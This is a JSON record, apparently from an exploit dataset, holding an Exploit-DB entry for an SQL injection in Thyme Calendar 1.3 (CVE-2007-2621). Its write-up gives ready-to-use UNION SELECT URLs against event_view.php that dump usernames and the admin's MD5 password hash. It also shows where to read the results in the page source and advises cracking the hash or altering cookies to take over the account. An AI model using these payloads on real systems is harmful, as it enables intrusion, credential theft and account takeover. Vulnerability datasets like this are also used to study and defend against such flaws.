{
  "id": "3895",
  "title": "Thyme Calendar 1.3 - SQL Injection",
  "cve": "CVE-2007-2621",
  "vuln_type": "sqli",
  "code": "                 ##################################################\r\n                 ## Thyme Calendar 1.3 SQL Vulnerability Exploit ##\r\n                 ##                  by Warlord                  ##\r\n                 ##################################################\r\n                 ##              codehook.110mb.com              ##\r\n                 ##################################################\r\n\r\n-------------------------------------------------------------------\r\nOVERVIEW AND DEFINITION\r\n-------------------------------------------------------------------\r\n\r\nA vulnerability in exists in Thyme Calendar 1.3 (and possibly lower \r\nversions) which\r\nallows execution of a custom SQL query.\r\n\r\nThe vulnerability exists in event_view.php, because the 'eid' field is not \r\nproperly\r\nvalidated. An attacker could exploit the vulnerabilit with the following \r\nrequest:\r\n\r\n\r\nhttp://sitename/thyme_directory/event_view.php?eid=34 UNION SELECT userid \r\nFROM thyme_Users\r\n\r\n\r\nWhere 'sitename' is the name of the site, and 'thyme_directory' is the \r\ndirectory in which\r\nThyme is located.\r\n\r\n-------------------------------------------------------------------\r\nSQL QUERY\r\n-------------------------------------------------------------------\r\n\r\nThe SQL query originally looks like this:\r\n\r\n\r\nSELECT id FROM thyme_Attachments WHERE eid = 34\r\n\r\n\r\nBut by changing the 'eid' field we get a query that looks like this:\r\n\r\n\r\nSELECT id FROM thyme_Attachments WHERE eid = 34 UNION SELECT userid FROM \r\nthyme_Users\r\n\r\n-------------------------------------------------------------------\r\nRESULT OF NEW QUERY\r\n-------------------------------------------------------------------\r\n\r\nThe result is that the query sends back all the userid's (actually \r\nusernames) from the\r\ndatabase instead of the 'id' from thyme_Attachments. You will be able to \r\ngrab the userid's\r\nfrom the HTML source by searching for 'aid=' as this is where the attachment \r\nid is\r\nsupposed to go. For example:\r\n\r\nhttp://sitename/thyme_directory/download_attachment.php?aid=admin\r\n\r\n-------------------------------------------------------------------\r\nGETTING PASSWORDS\r\n-------------------------------------------------------------------\r\n\r\nAnd the password (md5'd) can be obtained in the same fashion:\r\n\r\nhttp://sitename/thyme_directory/event_view.php?eid=34 UNION SELECT pass FROM \r\nthyme_Users\r\nWHERE username = \"admin\"\r\n\r\nIn the HTML source:\r\n\r\nhttp://sitename/thyme_directory/download_attachment.php?aid=9ab1c5afa4946ca0030271736f38c83a\r\n\r\n-------------------------------------------------------------------\r\nHOW TO EXPLOIT\r\n-------------------------------------------------------------------\r\n\r\nCookies should be modifiable. If not, crack the md5!\r\n\r\nhttp://md5.rednoize.com\r\n\r\n# milw0rm.com [2007-05-10]",
  "url": "https://www.exploit-db.com/exploits/3895"
}